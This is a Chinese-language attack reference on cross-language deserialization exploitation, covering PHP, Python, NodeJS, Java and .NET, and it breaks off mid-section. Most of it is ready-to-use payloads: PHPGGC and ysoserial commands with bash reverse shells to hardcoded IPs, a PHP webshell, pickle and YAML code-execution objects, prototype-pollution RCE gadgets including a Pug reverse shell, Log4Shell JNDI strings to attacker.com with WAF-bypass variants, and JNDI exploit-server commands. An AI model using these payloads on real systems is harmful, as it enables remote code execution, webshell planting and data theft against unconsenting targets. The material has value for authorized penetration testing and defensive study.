---
attack_surface: [编码/序列化滥用, 注入类, 认证/授权绕过]
impact: [远程代码执行, 权限提升, 信息泄露, 身份伪造]
risk_level: 严重
prerequisites:
  - 各语言基础编程概念
  - OOP 与类继承机制理解
  - Burp Suite / ZAP 基础操作
related_techniques:
  - phar-deserialization
  - prototype-pollution
  - jndi-injection
  - log4shell
  - viewstate-deserialization
  - yaml-deserialization
difficulty: 高级
tools:
  - ysoserial (Java)
  - ysoserial.net (.NET)
  - PHPGGC (PHP)
  - YSoNet (.NET)
  - GadgetProbe (Java)
  - JNDIExploit (Java)
  - marshalsec (Java)
  - Livepyre (Laravel Livewire)
  - Blacklist3r / Badsecrets (.NET)
  - peas.py (Python)
---

# Deserialization — 跨语言反序列化攻击全矩阵
> 关联文档：[Phar Deserialization](../../../Files/File Inclusion-Path Traversal/Phar Deserialization/) · [Prototype Pollution](../Prototype Pollution/) · [Class Pollution (Python)](../Class Pollution/) · [Log4Shell](../../../Application Frameworks/Log4Shell/) · [JNDI Injection](../../../Application Frameworks/JNDI/)

---

# 0x01 原理与分类

## 1.0 TL;DR

反序列化是将持久化或传输中的字节流恢复为运行时对象的过程。当应用程序对**攻击者可控的数据**执行反序列化，且未对反序列化的类型进行充分限制时，攻击者可通过构造恶意对象图（Gadget Chain）劫持反序列化流程，最终达成远程代码执行（RCE）、权限提升或敏感数据泄露。

核心风险公式：`untrusted_input → deserialize() → gadget chain → sink (exec / file_write / JNDI lookup)`

## 1.1 根本原理

序列化是将运行时对象转换为可存储/传输的字节序列；反序列化是逆过程。漏洞根因在于：

1. **类型信息嵌入载荷** — 大多数序列化格式在载荷中明文或编码包含类名/类型标识，攻击者可替换为任意类型
2. **隐式生命周期钩子** — 反序列化过程中自动触发的方法（`__destruct`、`readObject`、`__reduce__`、`_init_` 等）构成 Gadget 入口
3. **类路径上的可利用代码** — 攻击者不引入新代码，而是利用应用已加载的库中的现有类方法链（"gadget chain"）达到危险 sink

## 1.2 语言与序列化格式矩阵

| 语言 | 原生/内建序列化 | 危险反序列化入口 | 代表性 Gadget 工具 |
|------|-------------|---------------|-----------------|
| **PHP** | `serialize()` / `unserialize()` | `unserialize($_GET['x'])`, phar:// 协议触发的元数据反序列化 | PHPGGC |
| **Python** | `pickle.loads()` / `yaml.load()` (UnsafeLoader) | `pickle.loads(user_input)`, `yaml.load(data, Loader=UnsafeLoader)` | peas.py |
| **NodeJS** | `node-serialize`, `funcster`, `serialize-javascript`, `cryo` | `serialize.unserialize(data)`, Prototype Pollution 链 | — |
| **Java** | `ObjectInputStream.readObject()`, `ObjectInputStream.readUnshared()` | 任意 `readObject()` 调用, JNDI Reference 注入 | ysoserial, marshalsec |
| **.NET** | `BinaryFormatter.Deserialize()`, `Json.NET TypeNameHandling`, `LosFormatter`, `SoapFormatter` | `BinaryFormatter` 反序列化, ViewState 反序列化 | ysoserial.net, YSoNet |
| **Ruby** | `Marshal.load`, `YAML.load(Psych)`, `Oj.load`, `Ox.parse_obj` | `Marshal.load(user_input)`, `YAML.load(data)` | — |

## 1.3 攻击面归属（一级分类映射）

| 二级分类 | 关键攻击面 |
|----------|---------|
| 编码/序列化滥用 | PHP `unserialize()`, Python Pickle, Java `readObject()`, .NET `BinaryFormatter`, Ruby `Marshal.load` |
| 注入类 | YAML 反序列化（跨语言）, JNDI Reference 注入, SSTI 链接触发反序列化 |
| 认证/授权绕过 | 签名缺失的序列化 Token（ViewState 无 MAC）, 反序列化伪造会话对象 |
| 供应链/依赖 | 第三方库中的 Gadget Chain（Commons-Collections, Log4j, Laravel, Livewire） |

## 1.4 各语言反序列化自动触发的魔术方法/钩子

| 语言 | 反序列化时自动调用的方法 |
|------|---------------------|
| **PHP** | `__wakeup()`, `__destruct()`, `__sleep()`, `__toString()`, `__call()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__invoke()`, `__construct()`（phar 重绕入后） |
| **Python** | `__reduce__()`, `__reduce_ex__()`, `__setstate__()`, `__getstate__()` |
| **Java** | `readObject()`, `readResolve()`, `validateObject()`, `readExternal()`, `finalize()` |
| **.NET** | `OnDeserializing()`, `OnDeserialized()`, `GetObjectData()`, 构造函数 (ISerializable) |
| **Ruby** | `_load()`, `marshal_load()`, `init_with()` (Psych YAML), `[]=` 与 `merge` 中的 class pollution |

---

# 0x02 PHP 反序列化

## 2.1 核心机制

```php
// 序列化: 对象 → 字符串
$serialized = serialize($object); // O:4:"User":2:{s:4:"name";s:4:"John";s:3:"age";i:30;}

// 反序列化: 字符串 → 对象 (危险)
$object = unserialize($_GET['data']);
```

序列化字符串格式：`<类型>:<长度>:<值>;` — 类型包括 `O`(对象)、`a`(数组)、`s`(字符串)、`i`(整数)、`b`(布尔)、`N`(null)。

## 2.2 Magic Methods — 反序列化 Gadget 入口

PHP 的魔术方法在对象生命周期的特定时刻自动调用，不要求显式调用：

```php
class Exploit {
    public $cmd;
    function __wakeup()  { system($this->cmd); }  // unserialize() 后自动调用
    function __destruct() { system($this->cmd); }  // 对象销毁时自动调用
    function __toString() { return system($this->cmd); } // 对象被当作字符串时
    function __call($name, $args) { ... }  // 调用不存在的方法时
    function __get($name) { ... }  // 访问不存在的属性时
    function __set($name, $value) { ... } // 设置不存在的属性时
    function __invoke($x) { ... } // 对象被当作函数调用时
}
```

`__wakeup` 绕过（CVE-2016-7124 / PHP < 5.6.25 / < 7.0.10）：当序列化对象属性数量大于实际属性数量时，`__wakeup()` 不会被调用。

## 2.3 phar:// 协议反序列化

**关键特性**：phar 文件的**元数据以序列化格式存储**，PHP 的任何文件系统函数在操作 `phar://` 流时会**自动反序列化元数据**，即使函数本身不 eval PHP 代码。

受影响的函数包括：`file_get_contents()`、`fopen()`、`file()`、`file_exists()`、`md5_file()`、`filemtime()`、`filesize()`、`is_file()`、`is_dir()`、`copy()`、`rename()` 等。

```php
// 制作恶意 phar 文件
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>"); // JPG 魔术字节绕过上传限制
$object = new MaliciousClass('whoami');
$phar->setMetadata($object); // 元数据在 phar:// 访问时被反序列化
$phar->stopBuffering();
// 编译: php --define phar.readonly=0 create_phar.php
```

**phar:// 在 html2pdf 中的利用链**：`spipu/html2pdf` (≤ 5.3.0) 的 `<cert>` 标签通过 `file_exists()` 验证 `src`/`privkey` 属性，触发 phar 元数据反序列化。TCPDF 的 `__destruct` 在垃圾回收时 `unlink` 攻击者控制的路径。

## 2.4 PHPGGC — PHP Generic Gadget Chains

PHPGGC 是 PHP 反序列化的 Gadget 生成工具，覆盖主流 PHP 框架与库：

```bash
phpggc -l                          # 列出所有可用链
phpggc Laravel/RCE1 system id      # 生成 Laravel RCE 载荷
phpggc Guzzle/FW1 file_write /tmp/shell.php '<?php system($_GET["c"]); ?>'
phpggc Monolog/RCE1 system 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'
phpggc -l | grep -E "Drupal|Yoast|OpenCart"  # 2025 年新增链
```

**allowed_classes 绕过**：PHP 7.0+ 的 `unserialize()` 支持 `options` 参数限制允许的类，但 PHPGGC 可利用 "only allow one class" 的假设进行绕过。

## 2.5 Autoload 滥用 — 跨应用 Gadget 加载

当目标应用本身没有可利用的 Gadget，但同一容器内存在**另一个带易受攻击库的 Composer 应用**时：

1. 使用 `spl_autoload_register` 的回退机制加载另一应用的 Composer autoload
2. 通过类名中的 `_` 转 `/` 实现路径穿越（如 `tmp_passwd` → `/tmp/passwd.php`）
3. 在同一个反序列化请求中先加载 autoload 再触发 Gadget

```php
// 三步载荷：加载 autoload → 写 webshell → LFI 加载执行
a:3:{
  s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}
  s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{...} // 写 /tmp/a.php
  s:6:"Extra3";O:5:"tmp_a":0:{} // LFI 加载执行
}
```

**private → public 属性修复**：当跨应用加载 Gadget 时，如果目标类的属性声明与原链不同，需将 phpggc 链中的 private 属性改为 public，否则反序列化后属性值为空。

## 2.6 Laravel Livewire — Hydration Synthesizer 滥用

Livewire 3 通过 JSON snapshot 在客户端和服务端间同步组件状态。Snapshot 包含 `data`、`memo`、`checksum`（HMAC-SHA256），由 `APP_KEY` 派生。

**已知 APP_KEY 时的利用**：

1. 捕获合法 `/livewire/update` 请求，解码 `components[0].snapshot`
2. 注入嵌套合成元组（synthetic tuples）指向 Gadget 类
3. 重新计算 `checksum`，重放请求

关键 Synthesizer 原语：

| Synthesizer | 攻击行为 |
|-------------|---------|
| **CollectionSynth (`clctn`)** | `new $meta['class']($value)` — 任意类实例化 |
| **FormObjectSynth (`form`)** | `new $meta['class']($component, $path)` 后赋值所有 public 属性 |
| **ModelSynth (`mdl`)** | `return new $class` — 零参数任意类实例化 |

**CVE-2025-54068 — 无需 APP_KEY 的 RCE（v3 ≤ 3.6.3）**：

核心原理：`updates` 不受 snapshot checksum 保护。`getMetaForPath()` 信任已存在的 synth 元数据。攻击路径：

1. 找到弱类型 public 属性（如 `public $count;`）
2. 通过 update 将属性设为 `[]`，使下一轮 snapshot 存储为 arr tuple
3. 构造嵌套 malicious tuple 的 updates 载荷，注入 `clctn`/`form` synth
4. 利用 CollectionSynth 实例化 Queueable gadget，`dispatchNextJobInChain()` 触发 `unserialize()`

**高价值预认证目标**：Filament 登录表单 — FormObjectSynth 对象在 snapshot 中已存在，无需 scalar → array 强制步骤。

**自动化工具**：[Livepyre](https://github.com/synacktiv/Livepyre) 支持 CVE-2025-54068 和已知 APP_KEY 两种模式。

## 2.7 真实案例

### CVE-2024-5932 — GiveWP < 3.14.2 未认证 POP 链 → RCE

WordPress GiveWP 捐款插件在 `give_process_donation` 中反序列化 `give_title` 字段，无需认证。利用 `Stripe\StripeObject` → `Faker\ValidGenerator` POP 链，最终调用 `shell_exec`。盲打输出，使用反向 Shell 回调。

```http
POST /donations/the-things-we-need/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

amount=5&give-form-id=1&give-form-title=Any&give-gateway=offline&action=give_process_donation&give_title=O:31:"Stripe\StripeObject":1:{...}
```

### CVE-2026-24765 — PHPUnit PHPT Coverage 反序列化

phpunit < 8.5.52 / 9.6.34 在 PHPT runner 中反序列化 `.coverage` 文件。CI 流水线中，攻击者在 PR 中投递恶意 coverage 文件即可在 CI 容器内 RCE。

### TCPDF `__destruct` 任意文件删除

TCPDF 实例垃圾回收时调用 `_destroy(true)`，遍历 `$this->imagekeys` 并 `unlink()` K_PATH_CACHE 下的文件。通过 `unserialize()` → `writeHTML()` 路径触发，或通过 `html2pdf` 的 `<cert>` 标签 + `phar://` 入口触发 POP 链。

---

# 0x03 Python 反序列化

## 3.1 Pickle 反序列化

```python
import pickle
pickle.loads(user_input)  # 危险 — 任意代码执行
```

Pickle 是一个**基于栈的语言**（PM —— Pickle Machine）。`__reduce__()` 方法定义对象如何被序列化，返回 `(callable, args)` 元组，反序列化时直接调用。

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
pickle.loads(payload)  # 执行 whoami
```

**pickle 协议操作码关键指令**：
- `R` — `reduce`：调用 callable + args
- `i` — `inst`：实例化旧式类
- `o` — `obj`：实例化新式类
- `(` — `mark`：压入标记栈
- `.` — `stop`：停止

**绕过 Python 沙箱**：当 pickle 被用于沙箱内的对象序列化时，`__reduce__` 的限制可通过 `GLOBAL` 操作码加载任意模块函数绕过。

## 3.2 YAML 反序列化 (PyYAML / ruamel.yaml)

```python
import yaml
# 危险 Loader — 允许序列化 Python 对象
yaml.load(data, Loader=UnsafeLoader)
yaml.load(data, Loader=Loader)       # PyYAML < 5.1
yaml.unsafe_load(data)
yaml.full_load_all(data)
# 安全 Loader — 不支持对象反序列化
yaml.safe_load(data)
yaml.load(data, Loader=SafeLoader)
```

PyYAML 序列化 Python 对象示例：
```yaml
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:time.sleep [2]
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - cat
  - /root/flag.txt
```

**PyYAML < 5.1 `.load()` 无 Loader 漏洞**：在不指定 Loader 的旧版本中，`yaml.load(data)` 默认允许 `!!python/object/new:` 等标签，可直接构造 RCE 载荷：

```yaml
!!python/object/new:str
state: !!python/tuple
  - 'print(getattr(open("flag.txt"), "read")())'
  - !!python/object/new:Warning
    state:
      update: !!python/name:exec
```

## 3.3 jsonpickle 反序列化

jsonpickle 将 Python 对象序列化为 JSON，通过 `py/reduce`、`py/type`、`py/tuple` 等键编码对象信息：

```json
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cat", "/root/flag.txt"]}]}]}
```

## 3.4 Class Pollution — Python 的 Prototype Pollution

Python 类层次结构可被递归 merge 操作污染。与 JS Prototype Pollution 类似，攻击者通过 `__class__`、`__base__`、`__globals__` 等属性遍历类继承链。

### 基本污染路径

```python
# 通过 merge 污染类属性
USER_INPUT = {
    "__class__":{
        "__base__":{
            "__base__":{
                "custom_command": "whoami"  # 污染父类默认值
            }
        }
    }
}
```

### 通过 `__globals__` 跨越作用域

```python
# 从实例访问全局变量，污染任意模块
merge({'__class__':{'__init__':{'__globals__':{
    'not_accessible_variable':'Polluted variable',
    'NotAccessibleClass':{'__qualname__':'PollutedClass'}
}}}}, SomeInstance())
```

### `__kwdefaults__` — 覆写函数关键字参数默认值

```python
# 污染函数默认命令参数
USER_INPUT = {"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}
```

### 跨文件 Flask Secret 污染

```python
# 从非主模块的文件内遍历到主应用
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```

### `subprocess` 环境变量注入

```python
USER_INPUT = {"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}
subprocess.Popen('whoami', shell=True)  # calc.exe 弹出
```

---

# 0x04 NodeJS 反序列化

## 4.1 危险序列化库

### node-serialize

```javascript
var serialize = require('node-serialize');
serialize.unserialize(user_input); // 危险
```

node-serialize 使用 `_$$ND_FUNC$$_` 标记函数字符串，反序列化时直接 `eval()`：

```json
{"key":"_$$ND_FUNC$$_function(){ require('child_process').exec('whoami'); }()"}
```

### funcster

```javascript
{"key": "function(){ return require('child_process').execSync('id').toString(); }()"}
```

funcster 通过 `require('vm').runInThisContext()` 执行反序列化出的函数，与 node-serialize 同理危险。

### serialize-javascript

`serialize-javascript` 的反序列化配合 `eval()` 使用时存在代码执行风险：

```javascript
var deserialized = eval('(' + serializeJavascript(data) + ')');
```

### Cryo

Cryo 支持序列化函数体字符串，反序列化时通过 `Function` 构造函数重建函数并执行。

## 4.2 Prototype Pollution → RCE

### 污染原理

JavaScript 的 `__proto__` 属性指向对象原型。当 merge/clone/set 操作在用户可控数据上运行时，可通过 `__proto__` 或 `constructor.prototype` 污染所有对象的原型链：

```javascript
// 污染 Object.prototype — 影响所有对象
let user = {};
Object.prototype.isAdmin = true;
console.log(user.isAdmin); // true

// 通过 JSON 载荷触发污染
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

### PP2RCE — 环境变量 Gadget

NodeJS 的 `child_process` 方法（`fork`、`spawn`、`exec` 等）在调用 `normalizeSpawnArguments` 时遍历 `env` 对象的所有属性（**包括原型链上的属性**）生成环境变量：

```javascript
// 污染 NODE_OPTIONS + env，在 fork 时 RCE
b = {}
b.__proto__.env = {
  EVIL: "console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//",
}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork("a_file.js")  // 执行 /tmp/pp2rce
```

### PP2RCE — cmdline Gadget

使用 `argv0` + `/proc/self/cmdline` 替代 `/proc/self/environ`：

```javascript
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
```

### PP2RCE — `--import` Data URI（Node ≥ 19）

无需文件系统写入，通过 `data:` URI 嵌入载荷：

```javascript
const js = "require('child_process').execSync('touch /tmp/pp2rce_import')"
const payload = `data:text/javascript;base64,${Buffer.from(js).toString('base64')}`
b.__proto__.NODE_OPTIONS = `--import ${payload}`
fork("./a_file.js")
```

**2025 年 6 月现状**：Node 22.2.0 仍支持 `--import` 在 `NODE_OPTIONS` 中的 data-URI，尚未有官方缓解措施。

### 各 child_process 函数利用矩阵

| 函数 | env 注入 | cmdline 注入 | stdin 注入 | execArgv | shell 劫持 |
|------|---------|------------|----------|---------|----------|
| **fork** | ✓ | ✓ | ✗ | ✓ | ✗ |
| **exec** | ✗ | ✓ | ✗ | ✗ | ✓ |
| **execSync** | ✓ | ✓ | ✓ | ✗ | ✓ |
| **spawn** | ✓(需 options) | ✓(需 options) | ✗ | ✗ | ✓(需 options) |
| **execFileSync** | ✓ | ✓ | ✓ | ✗ | ✓ |
| **spawnSync** | ✓(需 options) | ✓(需 options) | ✓(需 options) | ✗ | ✓(需 options) |

> **Node 18.4.0+ kEmptyObject 修复**：`options` 参数从 `{}` 改为 `kEmptyObject`（无原型链），阻止了无显式 options 调用时的污染。但 `env` + `NODE_OPTIONS` + `--import` 路径仍可用。

### 控制 require 路径实现 PP2RCE

当目标代码中有 `require()` 调用但无 `child_process` 触发时：

1. 找到系统中 require 时自动调用 spawn 的 JS 文件（如 `yarn/preinstall.js`、`npm/scripts/changelog.js`）
2. 通过原型污染劫持 require 解析路径指向该文件
3. 同时污染 `NODE_OPTIONS` 实现 RCE

```bash
# 搜索 require 时触发 child_process 的文件
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read f; do
    grep --with-filename -nE "^[a-zA-Z].*(exec\(|fork\(|spawn\()" "$f"
done
```

```javascript
// 绝对路径 require 劫持
b.__proto__.main = "/tmp/malicious.js"  // 目标包无 package.json main 字段
// 相对路径 require 劫持 (方法1)
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"
// 相对路径 require 劫持 (方法2)
b.__proto__.data = { exports: { ".": "./malicious.js" } }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js"
```

## 4.3 AST Injection — 模板引擎原型污染到 RCE

### Handlebars

```javascript
Object.prototype.type = "Program"
Object.prototype.body = [{
    type: "MustacheStatement",
    path: 0,
    params: [{
        type: "NumberLiteral",
        value: "process.mainModule.require('child_process').execSync('id').toString()"
    }],
    loc: { start: 0, end: 0 }
}]
const template = Handlebars.precompile("Hello {{ msg }}")
eval("(" + template + ")")["main"].toString()  // 执行命令
```

### Pug

```javascript
Object.prototype.block = {
    "type": "Text",
    "line": "process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"')"
}
```

## 4.4 React Server Components — CVE-2025-55182

React Flight 协议序列化 RSC 载荷时，`node-serialize` 风格的函数标记 `_$$ND_FUNC$$_` 可在 React Server Components 端点被滥用。Next.js App Router 在特定配置下将 RSC 端点暴露为无认证 HTTP 端点，攻击者可发送含恶意函数的序列化载荷实现 RCE。

---

# 0x05 Java 反序列化

## 5.1 ObjectInputStream.readObject() 基础

```java
// 反序列化入口
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject(); // 危险 — 任意类实例化 + readObject() 调用
```

反序列化过程中自动调用的方法：
1. `readObject()` — 类特定反序列化逻辑（private 声明）
2. `readResolve()` — 可替换反序列化结果
3. `validateObject()` — ObjectInputValidation 回调
4. `readExternal()` — Externalizable 接口
5. **构造函数不被调用** — Gadget 链完全依赖上述回调

`readObject()` 中的反模式（足以构成 Gadget 入口）：
1. 调用可覆写方法或接口方法
2. 执行 JNDI 查询 / 反射 / 类加载 / 表达式求值
3. 遍历攻击者控制的集合（触发 `hashCode()` / `equals()` / Comparator）
4. 注册含危险后处理的 `ObjectInputValidation` 回调
5. 仅靠 private 声明保护不足

## 5.2 URLDNS — DNS 探测与可达性验证

`java.net.URL.hashCode()` → `getHostAddress()` 发起 DNS 查询。将 URL 对象放入 HashMap 中序列化，反序列化时 HashMap 的 `putVal(hash(key))` 触发 URL 的 `hashCode()`。

```java
HashMap ht = new HashMap();
URL u = new URL(null, "http://xxx.burpcollaborator.net", handler);
ht.put(u, "value");
// 通过反射将 hashCode 重置为 -1（绕过 put 时的 DNS 查询缓存）
Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);
// 反序列化 ht 时自动触发 DNS 查询
```

**GadgetProbe**：在 URLDNS 基础上，先尝试反序列化目标类，仅类存在时才发送 DNS 请求，实现类路径探测。

**Java Deserialization Scanner**（Burp 插件）：被动检测 Java 序列化魔术字节，主动测试 ysoserial 载荷。

## 5.3 Gadget Chains — CommonsCollections1 原理

```java
// 完整的 CC1 Transformer 链展开等价于：
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});

// Transformer 数组实现逐步反射调用：
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),              // (1) 获取 Runtime.class
    new InvokerTransformer("getMethod",                   // (2) 获取 getRuntime 方法
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",                      // (3) invoke 获取 Runtime 实例
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",                        // (4) exec 执行命令
        new Class[]{String.class}, command)
};
ChainedTransformer chain = new ChainedTransformer(transformers);
Map lazyMap = LazyMap.decorate(new HashMap(), chain);
lazyMap.get("anything"); // 触发 chain.transform()
```

ysoserial 使用 `AnnotationInvocationHandler` 作为反序列化触发点，因为该类的 `readObject()` 方法最终调用 memberValue 的 `get()` 方法。

**2023-2025 新案例**：
- **Spring-Kafka CVE-2023-34040**：反序列化来自攻击者控制 topic 的异常头
- **Aerospike Java Client CVE-2023-36480**：信任服务端返回序列化对象
- **pac4j-core CVE-2023-25581**：RestrictedObjectInputStream 允许的类仍大到足以构造 Gadget

## 5.4 SignedObject 门控反序列化（CVE-2025-10035 模式）

```java
// 典型的"受保护"反序列化模式
SignedObject so = (SignedObject) ValidatingInputStream.deserialize(payload, SignedObject.class);
if (!so.verify(pub, sig)) throw new IOException("Unable to verify signature!");
SignedContainer inner = (SignedContainer) so.getObject(); // RCE 原语在此
```

攻击条件（需满足其一）：
1. 获取签名私钥
2. 签名 Oracle（让可信服务签署攻击者控制的内容）
3. 绕过签名验证的替代路径

**预认证可达性模式**：错误处理路径在未认证上下文中创建会话 Token。GoAnywhere MFT 的错误处理器在收到无效 JSF ViewState 时主动生成 `ASESSIONID` 和 License Request Token，使未认证攻击者到达 SignedObject 反序列化 sink。

## 5.5 JNDI Injection & Log4Shell

### JNDI 基础

JNDI 是 Java 的命名与目录服务接口。危险调用：
```java
ctx.lookup("ldap://attacker.com/Exploit")  // 攻击者控制 URL
```

三种 JNDI 协议向量：
- `rmi://attacker-server/bar`
- `ldap://attacker-server/bar`
- `iiop://attacker-server/bar`

**JDK 版本保护边界**：
- `java.rmi.server.useCodebaseOnly = true` (JDK ≥ 7u21)
- `com.sun.jndi.ldap.object.trustURLCodebase = false` (JDK ≥ 8u121 / 7u131 / 6u141)
- 以上保护**仅阻止远程 codebase 加载**，不阻止反序列化攻击向量

### Log4Shell (CVE-2021-44228)

Log4j 2.x (2.0-beta9 至 2.14.1) 的 JNDI Lookup 特性：

```
${jndi:ldap://attacker.com/Exploit}
${jndi:ldap://127.0.0.1#attacker.com/Exploit}  // 2.15 本地检查绕过
```

**绕过 Payload（2022-2024 WAF 演变）**：
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attacker.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/z}
${${::-j}ndi:rmi://attacker.com/}    // 非 LDAP 协议
${${::-j}ndi:dns://attacker.com/}    // DNS 协议
${${lower:jnd}${lower:${upper:ı}}:ldap://...}  // Unicode "i"
```

### Log4Shell 相关 CVE 速览

| CVE | 严重性 | 影响 |
|-----|--------|------|
| CVE-2021-44228 | Critical | RCE — JNDI Lookup 注入 (2.0-beta9 - 2.14.1) |
| CVE-2021-45046 | Critical | DoS → RCE (2.15.0 修复不完整) |
| CVE-2021-4104 | High | JMSAppender 反序列化 (Log4j 1.x) |
| CVE-2021-42550 | Moderate | Logback JNDI 注入 |
| CVE-2021-45105 | High | DoS (2.16.0 → 2.17.0) |
| CVE-2021-44832 | High | JDBCAppender RCE (需控制配置文件) |

### 利用工具

```bash
# marshalsec — LDAP 重定向服务
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8000/#Exploit"

# JNDIExploit (已从 GitHub 撤下, Web Archive 有缓存)
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ATTACKER_IP -p 8888
# 可用载荷模板:
# ldap://null:1389/Basic/Command/Base64/<b64_cmd>
# ldap://null:1389/Basic/ReverseShell/<ip>/<port>

# ysoserial + JNDI-Exploit-Kit (高 JDK 版本反序列化路径)
java -jar ysoserial.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > cc5.ser
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P cc5.ser
```

### Log4j 2.16+ 后利用

2.16.0 移除了消息 Lookup，2.17.0 仅对配置中的 lookup 字符串递归展开。在配置中注入 `${sys:cmd}` 时：
- `${env:FLAG}` 可泄露环境变量
- `${java:${env:FLAG}}` 通过异常消息泄露（Lookup 不存在时抛出含 key 的异常）
- `%replace{${env:FLAG}}{regex}{substitution}` 结合 ReDoS 实现时间基数据外泄
- 嵌套 `%replace` 放大攻击（29 × 54^6 ≈ 96B 次替换 → Flask 超时 → 500）

## 5.6 JSF ViewState 反序列化

JavaServer Faces (JSF) 的 ViewState 参数可被错误配置为无 MAC 保护，导致反序列化。

```bash
# 使用 ysoserial 生成 ViewState gadget
java -jar ysoserial.jar CommonsCollections5 'command' | base64
# 在 POST 请求中替换 javax.faces.ViewState 参数
```

---

# 0x06 .NET 反序列化

## 6.1 ObjectDataProvider + ExpandedWrapper Gadget

`System.Windows.Data.ObjectDataProvider` 封装任意对象，通过 `MethodName` 和 `MethodParameters` 调用任意方法。在反序列化过程中 setter 触发 `Refresh()` → `BeginQuery()` → `QueryWorker()` → `InvokeMethodOnInstance()`：

```csharp
ObjectDataProvider myODP = new ObjectDataProvider();
myODP.ObjectType = typeof(Process);
myODP.MethodParameters.Add("cmd.exe");
myODP.MethodParameters.Add("/c calc.exe");
myODP.MethodName = "Start";  // 反序列化时自动调用 Process.Start
```

当序列化器使用 `GetType()` 而非预期类型时，`ExpandedWrapper<T, U>` 提供类型声明桥接：

```csharp
ExpandedWrapper<Process, ObjectDataProvider> wrap = new ExpandedWrapper<Process, ObjectDataProvider>();
wrap.ProjectedProperty0 = myODP;  // 封装 ODP 提供类型信息
```

## 6.2 JSON.NET 与 XMLSerializer 中的反序列化

**Json.NET `TypeNameHandling`**：启用时 JSON 中的 `$type` 字段指定反序列化类型，配合 `ObjectDataProvider` 实现 RCE：

```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib",
        "$values": ["cmd", "/c calc.exe"]
    },
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    }
}
```

## 6.3 YSoNet / ysoserial.net — 主要 Gadget 链

| Gadget | 原语 | 适用序列化器 |
|--------|------|-----------|
| **TypeConfuseDelegate** | 损坏 DelegateSerializationHolder，委托指向任意方法 | BinaryFormatter, SoapFormatter, NetDataContractSerializer |
| **ActivitySurrogateSelector** | 绕过 .NET ≥ 4.8 类型过滤，直接调用构造函数或编译 C# | BinaryFormatter, NetDataContractSerializer, LosFormatter |
| **DataSetOldBehaviour** | 通过 DataSet 旧 XML 表示实例化任意类型 | LosFormatter, BinaryFormatter, XmlSerializer |
| **GetterCompilerResults** | 在 WPF 支持的运行时链式调用属性 getter 直到编译/加载 DLL | Json.NET typeless, MessagePack typeless |
| **ObjectDataProvider** | 调用任意静态方法，支持 XAML URL 远程托管 | BinaryFormatter, Json.NET, XAML |
| **PSObject (CVE-2017-8565)** | 将 ScriptBlock 注入 PSObject ↓ PowerShell 反序列化时执行 | PowerShell Remoting, BinaryFormatter |

```powershell
# YSoNet 生成 — 输出到 stdout 可直接管道
ysonet.exe TypeConfuseDelegate "calc.exe" > payload.bin
ysonet.exe ObjectDataProvider --xamlurl http://attacker/o.xaml > payload.xaml
ysonet.exe GetterCompilerResults -c Loader.dll > payload.json
```

## 6.4 ViewState 反序列化

### 配置测试矩阵

| .NET 版本 | MAC | Encryption | 需要 MachineKey | 工具 |
|-----------|-----|-----------|----------------|------|
| 任意 | 关闭 | 关闭 | 否 | ysoserial.net (无签名) |
| < 4.5 | 开启 | 关闭 | 是 (validationKey) | Blacklist3r + ysoserial.net |
| < 4.5 | 任意 | 开启 | 是 (需两 key) | Blacklist3r + ysoserial.net (去除 `__VIEWSTATEENCRYPTED`) |
| ≥ 4.5 | 任意组合 (除全关) | 是 (需两 key + path) | Blacklist3r + ysoserial.net |

### 关键测试案例

**Case 1 — 无 MAC 无加密**（三条件满足其一）：
- 页面级 `EnableViewStateMac=false`
- 全局 `enableViewStateMac=false`
- 注册表 `AspNetEnforceViewStateMac=0`

```bash
